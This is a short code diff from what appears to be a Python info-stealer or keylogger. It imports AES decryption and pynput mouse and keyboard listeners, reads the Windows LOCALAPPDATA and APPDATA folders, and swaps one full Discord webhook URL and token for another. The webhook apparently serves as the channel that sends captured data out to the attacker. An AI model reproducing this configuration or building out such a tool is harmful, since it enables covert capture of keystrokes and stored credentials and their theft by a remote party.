@@ -27,7 +27,7 @@ from Crypto.Cipher import AES
 from pynput import mouse, keyboard as pynput_keyboard
 from pynput import mouse, keyboard
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1427980430501740625/s_gLw7jgJRqQnCWGgtyfZLehwQj0KnFtBBKg2qVeWW2af5m3AZiAm0K_Qwh7KPFq1n5C"
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
